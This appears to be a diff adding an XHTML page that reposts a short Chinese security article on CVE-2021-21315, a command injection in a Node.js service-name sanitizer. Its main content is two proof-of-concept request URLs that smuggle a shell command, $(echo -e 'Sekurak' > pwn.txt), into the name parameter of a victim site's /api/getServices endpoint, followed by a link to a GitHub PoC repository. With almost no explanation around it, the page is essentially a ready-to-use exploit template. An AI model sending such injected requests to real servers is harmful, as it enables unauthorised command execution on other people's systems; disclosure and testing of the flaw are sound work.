@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>CVE-2021-21315 Node.JS OS命令执行</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>CVE-2021-21315 Node.JS OS命令执行</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NDUxMTI2NA==&amp;mid=2247484807&amp;idx=1&amp;sn=b0249f1fbfe480c8de54d59807ebaf0d&amp;chksm=a687e54891f06c5ebf9fbd63405c0c25e552e546da7db353dd1cfdaff2b58f382699b3932978&amp;scene=126&amp;sessionid=1681663453#rd">http://mp.weixin.qq.com/s?__biz=MjM5NDUxMTI2NA==&amp;mid=2247484807&amp;idx=1&amp;sn=b0249f1fbfe480c8de54d59807ebaf0d&amp;chksm=a687e54891f06c5ebf9fbd63405c0c25e552e546da7db353dd1cfdaff2b58f382699b3932978&amp;scene=126&amp;sessionid=1681663453#rd</a></blockquote><div>CVE-2021-21315 Node.JS OS sanitize service Parameters Command Injection</div><div><br/></div><div>[PoC]</div><div>[Victim Site]/api/getServices?name=$(echo -e 'Sekurak' &gt; pwn.txt)</div><div>[Victim Site]/api/getServices?name[]=$(echo -e 'Sekurak' &gt; pwn.txt)</div><div><br/></div><p><img class="item item-image" data-type="2" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNZPX7v1seZ4XWgBaHuiaBBPQLsLiafqvm8hibD0je0jJvLLMKFu35SmSJl8YcZf3ADAOTN2ibFgcWBbRg/640?wx_fmt=jpeg" style="height: px;" src="../Images/8851a9472b12cbb3e90a43e4e0ef48dc.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNZPX7v1seZ4XWgBaHuiaBBPQLsLiafqvm8hibD0je0jJvLLMKFu35SmSJl8YcZf3ADAOTN2ibFgcWBbRg/640?wx_fmt=jpeg"/></p><p><br/></p><p><br/></p><p><img class="item item-image" data-type="2" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNZPX7v1seZ4XWgBaHuiaBBPQgFwSOiadaZibK3ayVkon4v2GNg8E3bPHQGNPpSKr3icN1VF2Eibtectia3w/640?wx_fmt=jpeg" style="height: px;" src="../Images/cbbc5cb47a526bee59d710de9ce07b5e.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNZPX7v1seZ4XWgBaHuiaBBPQgFwSOiadaZibK3ayVkon4v2GNg8E3bPHQGNPpSKr3icN1VF2Eibtectia3w/640?wx_fmt=jpeg"/></p><div><br/></div><div>https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC<br/></div>
+        
+</body>
+</html>
